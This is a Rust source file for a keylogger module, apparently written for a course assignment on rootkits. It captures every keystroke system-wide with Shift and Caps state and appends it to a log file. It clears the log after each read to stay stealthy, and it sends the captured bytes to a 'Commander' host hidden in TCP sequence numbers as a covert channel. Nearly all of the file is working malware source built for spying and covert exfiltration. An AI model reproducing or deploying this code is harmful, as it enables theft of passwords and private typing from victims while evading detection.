use rdev::{listen, Event, EventType, Key};
use std::fs::OpenOptions;
use std::io::{self, Write};
use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::thread;

// Mirroring the C "modifier_state_t" for accurate logging as per professor's example
struct Modifiers {
    shift: bool,
    ctrl: bool,
    caps: bool,
}

pub struct KeyLogger {
    file_path: String,
    is_running: Arc<AtomicBool>,
    modifiers: Arc<Mutex<Modifiers>>, 
}

impl KeyLogger {
    pub fn new(file_path: &str) -> Self {
        Self {
            file_path: file_path.to_string(),
            is_running: Arc::new(AtomicBool::new(false)),
            modifiers: Arc::new(Mutex::new(Modifiers { 
                shift: false, 
                ctrl: false, 
                caps: false 
            })),
        }
    }

    /// Requirement: Transfer the key log file from the victim
    /// Reads the content and clears the file to keep the rootkit stealthy.
    pub fn harvest_logs(&self) -> io::Result<String> {
        let content = std::fs::read_to_string(&self.file_path)?;
        // Clear file after read to prevent huge logs and repeated data
        std::fs::write(&self.file_path, "")?;
        Ok(content)
    }

    /// Requirement: Start the keylogger on the victim
    pub fn start(&self) {
        if self.is_running.load(Ordering::SeqCst) { return; }
        self.is_running.store(true, Ordering::SeqCst);

        let running = self.is_running.clone();
        let mods_lock = self.modifiers.clone();
        let path = self.file_path.clone();

        thread::spawn(move || {
            let mut file = OpenOptions::new()
                .append(true)
                .create(true)
                .open(path)
                .expect("Failed to open log file");

            // listen() blocks the thread to capture global OS events
            let _ = listen(move |event| {
                if !running.load(Ordering::SeqCst) { return; }

                let mut m = mods_lock.lock().unwrap();
                match event.event_type {
                    EventType::KeyPress(key) => {
                        match key {
                            Key::ShiftLeft | Key::ShiftRight => m.shift = true,
                            Key::ControlLeft | Key::ControlRight => m.ctrl = true,
                            Key::CapsLock => m.caps = !m.caps,
                            _ => {
                                // Log the key with modifier context (Shift/Caps)
                                let log_entry = format!("{:?} [Shift: {}, Caps: {}]\n", key, m.shift, m.caps);
                                let _ = file.write_all(log_entry.as_bytes());
                                let _ = file.flush(); 
                            }
                        }
                    }
                    EventType::KeyRelease(key) => {
                        match key {
                            Key::ShiftLeft | Key::ShiftRight => m.shift = false,
                            Key::ControlLeft | Key::ControlRight => m.ctrl = false,
                            _ => {}
                        }
                    }
                    _ => {}
                }
            });
        });
    }

    /// Requirement: Stop the keylogger on the victim
    pub fn stop(&self) {
        self.is_running.store(false, Ordering::SeqCst);
    }

    /// Requirement: All communication must be done via covert channels
    /// Loops through data and sends bytes via the TCP Sequence Number
    pub fn send_covert_log(&self, data: String, target_ip: Ipv4Addr) {
        let bytes = data.as_bytes();
        for byte in bytes {
            let covert_data = *byte as u32; 
            
            // Calls your port_knkr engine to send the raw packet
            if let Err(e) = crate::port_knkr::send_covert_packet(target_ip, 8000, covert_data) {
                eprintln!("[!] Covert send failed: {}", e);
            }
            
            // Pacing is critical to ensure the Commander's sniffer catches every packet
            thread::sleep(std::time::Duration::from_millis(30));
        }
    }
}
